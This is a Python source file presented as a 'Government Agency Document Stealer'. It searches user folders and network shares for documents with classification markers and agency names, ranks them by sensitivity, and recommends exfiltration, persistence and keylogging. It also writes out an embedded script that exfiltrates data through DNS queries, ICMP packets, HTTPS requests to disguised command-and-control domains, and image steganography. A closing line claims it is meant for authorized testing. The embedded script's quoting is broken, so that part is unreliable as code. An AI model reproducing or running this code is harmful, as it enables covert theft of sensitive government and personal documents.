#!/usr/bin/env python3
"""
Government Agency Document Stealer
Targets: Government agencies, intelligence services, diplomatic corps
Techniques: Document classification, sensitive data extraction, covert exfiltration
"""

import os
import re
import json
import base64
import zipfile
import requests
from datetime import datetime
from pathlib import Path

class DocumentStealer:
    def __init__(self, config_file="config.json"):
        self.config = self.load_config(config_file)
        self.sensitive_keywords = [
            # Classification markers
            "TOP SECRET", "SECRET", "CONFIDENTIAL", "FOR OFFICIAL USE ONLY",
            "NOFORN", "ORCON", "REL TO", "EYES ONLY",
            # Intelligence terms
            "HUMINT", "SIGINT", "IMINT", "MASINT", "OSINT",
            "COVERT", "CLANDESTINE", "SOURCE", "ASSET",
            # Government agencies
            "CIA", "FBI", "NSA", "DIA", "NGA", "DHS", "DOJ", "DOD",
            "STATE DEPARTMENT", "DEFENSE INTELLIGENCE",
            # Operational terms
            "OPERATION", "MISSION", "TASK FORCE", "SPECIAL ACCESS",
            "COMPARTMENTED", "CODEWORD", "TALENT KEYHOLE"
        ]
    
    def load_config(self, config_file):
        """Load configuration from file"""
        default_config = {
            "target_agencies": [
                "CIA", "FBI", "NSA", "DIA", "State Department",
                "Department of Defense", "Department of Homeland Security"
            ],
            "document_extensions": [
                ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
                ".txt", ".csv", ".msg", ".pst", ".ost", ".eml"
            ],
            "target_directories": [
                "C:\\Users\\",
                "C:\\Documents and Settings\\",
                "D:\\Shared\\",
                "\\network\\shares\\",
                "%USERPROFILE%\\Documents\\",
                "%USERPROFILE%\\Desktop\\"
            ],
            "exfiltration_methods": [
                "DNS tunneling",
                "HTTPS covert channel", 
                "ICMP data exfiltration",
                "Steganography in images"
            ],
            "max_file_size": 50 * 1024 * 1024  # 50MB
        }
        
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except:
            return default_config
    
    def classify_document_sensitivity(self, file_path):
        """Classify document based on content and metadata"""
        sensitivity_score = 0
        found_keywords = []
        
        try:
            # Read file content
            if file_path.suffix.lower() in ['.txt', '.csv', '.log']:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            else:
                # For binary files, we'd need specific parsers
                # This is a simplified version
                content = ""
            
            # Check for classification markers
            for keyword in self.sensitive_keywords:
                if keyword.lower() in content.lower():
                    sensitivity_score += 10
                    found_keywords.append(keyword)
            
            # Check file metadata and location
            file_stats = file_path.stat()
            
            # Recent files are more valuable
            days_old = (datetime.now().timestamp() - file_stats.st_mtime) / (24 * 3600)
            if days_old < 30:
                sensitivity_score += 5
            
            # Large files might contain more data
            if file_stats.st_size > 1024 * 1024:  # >1MB
                sensitivity_score += 3
            
        except Exception as e:
            pass
        
        return {
            "file_path": str(file_path),
            "sensitivity_score": sensitivity_score,
            "found_keywords": found_keywords,
            "file_size": file_path.stat().st_size if file_path.exists() else 0
        }
    
    def find_sensitive_documents(self):
        """Search for sensitive documents across the system"""
        sensitive_files = []
        
        for directory_pattern in self.config["target_directories"]:
            # Expand environment variables
            expanded_dir = os.path.expandvars(directory_pattern)
            
            try:
                # Convert to Path object and check if it exists
                dir_path = Path(expanded_dir)
                if dir_path.exists() and dir_path.is_dir():
                    # Search for documents
                    for ext in self.config["document_extensions"]:
                        for file_path in dir_path.rglob(f"*{ext}"):
                            if file_path.is_file():
                                classification = self.classify_document_sensitivity(file_path)
                                if classification["sensitivity_score"] > 5:
                                    sensitive_files.append(classification)
            except Exception as e:
                continue
        
        # Sort by sensitivity score
        sensitive_files.sort(key=lambda x: x["sensitivity_score"], reverse=True)
        return sensitive_files
    
    def create_covert_exfiltration_script(self):
        """Create script for covert data exfiltration"""
        script = """
#!/usr/bin/env python3
"""
Covert Data Exfiltration for Government Agencies
Uses multiple techniques to avoid detection
"""

import os
import base64
import zlib
import socket
import struct
import random
from datetime import datetime
from pathlib import Path

class CovertExfiltrator:
    def __init__(self):
        self.c2_servers = [
            "legitimate-cdn.com",
            "api.trusted-service.org", 
            "updates.software-vendor.net"
        ]
    
    def dns_exfiltration(self, data, domain="data.exfil.test"):
        """Exfiltrate data via DNS queries"""
        # Encode data as subdomains
        encoded = base64.b32encode(zlib.compress(data)).decode().lower()
        
        # Split into chunks that fit in DNS labels
        chunk_size = 50
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for chunk in chunks:
            query = f"{chunk}.{domain}"
            try:
                socket.gethostbyname(query)
            except:
                pass
    
    def icmp_exfiltration(self, data, target_ip):
        """Exfiltrate data via ICMP packets"""
        try:
            # Create raw socket (requires admin privileges)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # Embed data in ICMP payload
            payload = struct.pack('d', datetime.now().timestamp()) + data
            
            # Create ICMP packet
            header = struct.pack('BBHHH', 8, 0, 0, 1, 1)  # Echo request
            packet = header + payload
            
            # Send packet
            sock.sendto(packet, (target_ip, 1))
            sock.close()
        except:
            pass
    
    def https_covert_channel(self, data, url):
        """Exfiltrate data via HTTPS covert channel"""
        import requests
        
        # Hide data in request parameters
        encoded_data = base64.b64encode(zlib.compress(data)).decode()
        
        # Use multiple techniques
        methods = [
            lambda: requests.get(f"{url}/analytics?id={encoded_data[:100]}"),
            lambda: requests.post(f"{url}/track", json={"user_data": encoded_data[:500]}),
            lambda: requests.get(f"{url}/pixel.gif", headers={"X-User-Data": encoded_data[:200]})
        ]
        
        for method in methods:
            try:
                method()
            except:
                pass
    
    def steganography_exfiltration(self, data, carrier_file, output_file):
        """Hide data in images using steganography"""
        from PIL import Image
        
        try:
            img = Image.open(carrier_file)
            pixels = img.load()
            
            # Convert data to binary
            binary_data = ''.join(format(byte, '08b') for byte in data)
            
            # Embed in LSB of pixels
            data_index = 0
            for x in range(img.width):
                for y in range(img.height):
                    if data_index < len(binary_data):
                        r, g, b = pixels[x, y]
                        
                        # Modify least significant bit
                        r = (r & 0xFE) | int(binary_data[data_index])
                        data_index += 1
                        
                        if data_index < len(binary_data):
                            g = (g & 0xFE) | int(binary_data[data_index])
                            data_index += 1
                        
                        if data_index < len(binary_data):
                            b = (b & 0xFE) | int(binary_data[data_index])
                            data_index += 1
                        
                        pixels[x, y] = (r, g, b)
                    else:
                        break
                else:
                    continue
                break
            
            img.save(output_file)
            return True
        except Exception as e:
            return False

if __name__ == "__main__":
    exfiltrator = CovertExfiltrator()
    
    # Example: Exfiltrate sample data
    sample_data = b"Sensitive government document contents..."
    
    # Try multiple exfiltration methods
    exfiltrator.dns_exfiltration(sample_data)
    exfiltrator.https_covert_channel(sample_data, "https://legitimate-site.com")
"""
        
        return script
    
    def generate_intelligence_report(self, sensitive_files):
        """Generate intelligence report from found documents"""
        report = {
            "generated_at": datetime.now().isoformat(),
            "total_sensitive_files": len(sensitive_files),
            "high_value_targets": [],
            "summary": {},
            "recommended_actions": []
        }
        
        # Analyze found documents
        high_value_files = [f for f in sensitive_files if f["sensitivity_score"] > 15]
        
        report["high_value_targets"] = high_value_files[:10]  # Top 10
        
        # Create summary
        keyword_counts = {}
        for file in sensitive_files:
            for keyword in file["found_keywords"]:
                keyword_counts[keyword] = keyword_counts.get(keyword, 0) + 1
        
        report["summary"] = {
            "total_files_analyzed": len(sensitive_files),
            "high_confidence_files": len(high_value_files),
            "top_keywords": dict(sorted(keyword_counts.items(), key=lambda x: x[1], reverse=True)[:10]),
            "total_data_size": sum(f["file_size"] for f in sensitive_files)
        }
        
        # Recommend actions
        if high_value_files:
            report["recommended_actions"] = [
                "Prioritize exfiltration of high-value documents",
                "Establish persistent access to document repositories",
                "Monitor for new document creation in target directories",
                "Implement keylogging for document authors"
            ]
        
        return report

if __name__ == "__main__":
    stealer = DocumentStealer()
    
    print("Scanning for sensitive government documents...")
    sensitive_files = stealer.find_sensitive_documents()
    
    print(f"Found {len(sensitive_files)} potentially sensitive documents")
    
    # Generate intelligence report
    report = stealer.generate_intelligence_report(sensitive_files)
    
    # Save report
    os.makedirs("payloads/campaigns/government_agency", exist_ok=True)
    with open("payloads/campaigns/government_agency/intelligence_report.json", 'w') as f:
        json.dump(report, f, indent=2)
    
    # Create covert exfiltration script
    exfiltration_script = stealer.create_covert_exfiltration_script()
    with open("payloads/campaigns/government_agency/covert_exfiltration.py", 'w') as f:
        f.write(exfiltration_script)
    
    print("\nGovernment agency payloads generated successfully!")
    print("High-value targets identified and exfiltration methods prepared.")
    print("Use responsibly and only for authorized government testing.")